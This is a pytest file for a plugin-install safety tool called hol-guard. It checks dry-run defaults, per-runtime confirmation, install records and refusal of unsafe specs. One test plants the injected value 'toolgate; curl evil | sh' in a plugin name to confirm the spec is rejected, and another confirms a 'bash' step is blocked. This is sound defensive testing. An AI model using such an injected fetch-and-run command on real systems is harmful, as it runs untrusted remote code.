"""``hol-guard plugin install|uninstall``: plan rendering, apply, and the install record.

The argv for each runtime, every refused spec and the install record's rules
are pinned by the Rust tests in ``rust/crates/guard-plugin-kit/tests/install.rs``;
these cover the Python shim: dry-run by default, confirmation per runtime, no
shell, and the record that ``uninstall`` plans from and opt-in telemetry reads.
"""

from __future__ import annotations

import contextlib
import io
import json
import subprocess
from pathlib import Path
from typing import Any

import pytest

from codex_plugin_scanner import cli as guard_cli
from codex_plugin_scanner.guard import config as guard_config
from codex_plugin_scanner.guard.plugin_kit import install

SPEC = {
    "schema": "hol.plugin-install-spec.v1",
    "slug": "acme/toolgate",
    "name": "toolgate",
    "version": "1.2.0",
    "repository": "acme/toolgate",
    "listingUrl": "https://hol.org/registry/plugins/acme%2Ftoolgate",
    "trustScore": 82,
    "targets": [
        {
            "runtime": "claude-code",
            "marketplace": {"repository": "acme/toolgate", "name": "acme"},
            "plugin": "toolgate",
        },
        {"runtime": "codex", "marketplace": {"repository": "acme/toolgate", "name": "acme"}, "plugin": "toolgate"},
        {"runtime": "agent-skills", "repository": "acme/toolgate"},
    ],
    "manual": ["mcp"],
}


@pytest.fixture(autouse=True)
def guard_home(tmp_path_factory: pytest.TempPathFactory, monkeypatch: pytest.MonkeyPatch) -> Path:
    home = tmp_path_factory.mktemp("guard-home")
    monkeypatch.setattr(guard_config, "resolve_guard_home", lambda override=None: home)
    return home


@pytest.fixture
def spec_file(tmp_path: Path) -> Path:
    path = tmp_path / "spec.json"
    path.write_text(json.dumps(SPEC), encoding="utf-8")
    return path


@pytest.fixture
def programs(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> list[list[str]]:
    """Pretend claude and codex are on PATH and record what would run."""

    ran: list[list[str]] = []
    fake = {name: str(tmp_path / "bin" / name) for name in ("claude", "codex")}
    monkeypatch.setattr(install.shutil, "which", fake.get)

    def run(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
        assert kwargs["shell"] is False
        ran.append(argv)
        return subprocess.CompletedProcess(argv, 0)

    monkeypatch.setattr(install.subprocess, "run", run)
    return ran


def _run(argv: list[str], stdin: str = "") -> tuple[int, str, str]:
    output = io.StringIO()
    error = io.StringIO()
    original_argv, original_stdin = guard_cli.sys.argv, guard_cli.sys.stdin
    try:
        guard_cli.sys.argv = ["hol-guard"]
        guard_cli.sys.stdin = io.StringIO(stdin)
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(error):
            exit_code = guard_cli.main(argv)
    finally:
        guard_cli.sys.argv, guard_cli.sys.stdin = original_argv, original_stdin
    return exit_code, output.getvalue(), error.getvalue()


def test_install_prints_the_plan_and_runs_nothing_by_default(spec_file: Path, programs: list[list[str]]) -> None:
    exit_code, output, _error = _run(["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file)])
    assert exit_code == 0
    assert "claude plugin marketplace add acme/toolgate" in output
    assert "codex plugin add toolgate@acme" in output
    assert "npx skills add acme/toolgate" in output
    assert "Nothing was changed. Run with --apply" in output
    assert "Install by hand (see the listing): mcp" in output
    assert programs == []


def test_dry_run_is_the_default_and_cannot_be_combined_with_apply(spec_file: Path, programs: list[list[str]]) -> None:
    base = ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file)]
    assert _run([*base, "--dry-run"])[:2] == _run(base)[:2]
    with pytest.raises(SystemExit):
        _run([*base, "--dry-run", "--apply"])
    assert programs == []


def test_apply_confirms_each_runtime_and_never_runs_manual_steps(
    spec_file: Path, programs: list[list[str]], guard_home: Path
) -> None:
    exit_code, output, _error = _run(
        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply"], stdin="y\nn\n"
    )
    assert exit_code == 0
    assert [argv[1:] for argv in programs] == [
        ["plugin", "marketplace", "add", "acme/toolgate"],
        ["plugin", "install", "toolgate@acme"],
    ]
    assert programs[0][0].endswith("/claude")
    assert "codex: skipped." in output
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code"]}


def test_yes_installs_every_available_runtime_then_uninstall_reverses_it(
    spec_file: Path, programs: list[list[str]], guard_home: Path
) -> None:
    _run(["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes"])
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code", "codex"]}
    programs.clear()
    exit_code, _output, _error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0
    assert [argv[1:] for argv in programs] == [
        ["plugin", "uninstall", "toolgate@acme"],
        ["plugin", "remove", "toolgate@acme"],
    ]
    assert install.recorded_installs(guard_home) == {}


def test_a_failed_command_stops_that_runtime_and_is_not_recorded(
    spec_file: Path, monkeypatch: pytest.MonkeyPatch, programs: list[list[str]], guard_home: Path
) -> None:
    monkeypatch.setattr(install.subprocess, "run", lambda argv, **_kwargs: subprocess.CompletedProcess(argv, 3))
    exit_code, _output, error = _run(
        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes", "--runtime", "codex"]
    )
    assert exit_code == 1
    assert "exited with 3" in error
    assert install.recorded_installs(guard_home) == {}


def test_a_spec_with_command_text_is_refused_before_anything_runs(tmp_path: Path, programs: list[list[str]]) -> None:
    bad = json.loads(json.dumps(SPEC))
    bad["targets"][0]["plugin"] = "toolgate; curl evil | sh"
    path = tmp_path / "bad.json"
    path.write_text(json.dumps(bad), encoding="utf-8")
    exit_code, output, error = _run(
        ["plugin", "install", "acme/toolgate", "--spec-file", str(path), "--apply", "--yes"]
    )
    assert (exit_code, output, programs) == (2, "", [])
    assert "failed Guard's checks" in error


def test_a_pinned_version_must_match_the_listing(spec_file: Path) -> None:
    exit_code, _output, error = _run(["plugin", "install", "acme/toolgate@9.9.9", "--spec-file", str(spec_file)])
    assert exit_code == 2
    assert "HOL does not list that version" in error


def test_a_spec_for_another_listing_is_refused(spec_file: Path, programs: list[list[str]]) -> None:
    exit_code, _output, error = _run(
        ["plugin", "install", "acme/other", "--spec-file", str(spec_file), "--apply", "--yes"]
    )
    assert (exit_code, programs) == (2, [])
    assert "different listing" in error


def test_uninstall_only_removes_what_guard_installed(
    spec_file: Path, programs: list[list[str]], guard_home: Path
) -> None:
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert (exit_code, programs) == (2, [])
    assert "no record of installing" in error

    _run(
        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes", "--runtime", "codex"]
    )
    programs.clear()
    # The listing has since left HOL: uninstall never asks HOL, so it still works.
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--runtime", "claude-code"])
    assert exit_code == 2
    assert "no record of installing" in error
    exit_code, _output, _error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0
    assert [argv[1:] for argv in programs] == [["plugin", "remove", "toolgate@acme"]]
    assert install.recorded_installs(guard_home) == {}

    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate@1.2.0"])
    assert exit_code == 2
    assert "without a version" in error
    with pytest.raises(SystemExit):
        _run(["plugin", "uninstall", "acme/toolgate", "--spec-file", str(spec_file)])


def test_an_unreadable_record_stops_apply_before_anything_runs(
    spec_file: Path, programs: list[list[str]], guard_home: Path
) -> None:
    (guard_home / "plugin-kit").mkdir()
    (guard_home / "plugin-kit" / "installs.json").write_text("{not json", encoding="utf-8")
    argv = ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--runtime", "codex"]
    exit_code, output, error = _run([*argv, "--apply", "--yes"])
    assert (exit_code, programs) == (2, [])
    assert "installed" not in output
    assert "could not be read" in error
    assert (guard_home / "plugin-kit" / "installs.json").read_text(encoding="utf-8") == "{not json"
    # A plan alone never reads the record.
    assert _run(argv)[0] == 0


def test_a_record_that_cannot_be_written_fails_the_install(
    spec_file: Path, monkeypatch: pytest.MonkeyPatch, programs: list[list[str]]
) -> None:
    def fail(*_args: Any, **_kwargs: Any) -> None:
        raise install.PluginInstallError("Guard could not update its install record in the Guard home.")

    monkeypatch.setattr(install, "record", fail)
    exit_code, output, error = _run(
        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes", "--runtime", "codex"]
    )
    assert exit_code == 1
    assert "codex: installed" in output
    assert "may be out of date" in error


def test_only_allowed_programs_can_run(monkeypatch: pytest.MonkeyPatch, guard_home: Path) -> None:
    plan = {
        "action": "install",
        "slug": "acme/toolgate",
        "steps": [
            {"runtime": "codex", "program": "bash", "available": True, "automatic": True, "commands": [["bash"]]}
        ],
    }
    monkeypatch.setattr(install.subprocess, "run", pytest.fail)
    with pytest.raises(install.PluginInstallError):
        install.apply_plan(plan, assume_yes=True, record=pytest.fail, which=lambda name: f"/bin/{name}")


def test_telemetry_marks_only_listings_guard_installed(guard_home: Path) -> None:
    install.record(guard_home, "acme/toolgate", "codex", installed=True, spec=SPEC)
    report = {
        "entries": [
            {"slug": "acme/toolgate", "runtime": "codex", "version": None, "key": "a" * 64},
            {"slug": "acme/toolgate", "runtime": "claude-code", "version": None, "key": "b" * 64},
            {"slug": "other/plugin", "runtime": "codex", "version": None, "key": "c" * 64},
        ]
    }
    marked = install.mark_guard_installs(report, guard_home)["entries"]
    assert [entry.get("via") for entry in marked] == ["hol-guard", None, None]
    assert "via" not in report["entries"][0]
